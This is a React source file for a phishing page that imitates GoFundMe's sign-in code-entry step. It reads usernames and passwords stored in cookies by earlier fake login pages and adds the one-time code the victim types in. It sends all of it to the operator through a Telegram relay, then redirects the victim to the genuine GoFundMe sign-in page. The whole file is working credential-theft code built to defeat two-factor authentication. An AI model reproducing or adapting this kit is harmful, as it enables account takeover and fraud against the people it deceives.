import React from "react";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Code() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<code>({
    code: ""
  });

  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const message = `
    ----- GO FUND ME DETAILS -----
    Username: ${login1.username}
    Password: ${login1.password}
    Username 2: ${login2.username2}
    Password 2: ${login2.password2}
    Code: ${formInput.code}
    `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("login1", formInput);
    window.location.replace("https://www.gofundme.com/sign-in");
    setIsLoading(false);
  }

  return (
    <div>
      
      <form
        method="POST"
        onSubmit={handleSubmit}
        id="sign-in-form"
        className="susi-form_form__HS4LQ"
      >
        <p className="hrt-mb-4">Enter the code that's being sent to your phone/email</p>
        {/* <h2 className="hrt-show-for-lg hrt-mb-4 ds-override_heading2__GdTQ3">
          Your account details
        </h2> */}
        <div className="form_formRow__3vk2_ hrt-text-field">
          <div className="hrt-text-field-wrapper">
            <div className="hrt-text-field-inner">
              <input
                aria-invalid="false"
                className="hrt-text-field-input"
                id="code"
                placeholder=" "
                name="code"
                required
                onChange={handleInputChange}
              />
              <label className="hrt-text-field-label" htmlFor="email">
                Code
              </label>
            </div>
          </div>
        </div>
       
       
        <div className="susi-layout-footer_container__5oauA">
      
          {isLoading ? (
            <button
              className="susi-layout-footer_footerBtn__4suDz susi-layout-footer_primaryActionBtn__sO4FV hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button"
              data-element-id="btn_sign_in"
              type="button"
              form="sign-in-form"
              data-analytic-event-listener="true"
            >
              Please wait...
            </button>
          ) : (
            <button
              className="susi-layout-footer_footerBtn__4suDz susi-layout-footer_primaryActionBtn__sO4FV hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button"
              data-element-id="btn_sign_in"
              type="submit"
              form="sign-in-form"
              data-analytic-event-listener="true"
            >
              Submit
            </button>
          )}
        </div>
      </form>
    </div>
  );
}
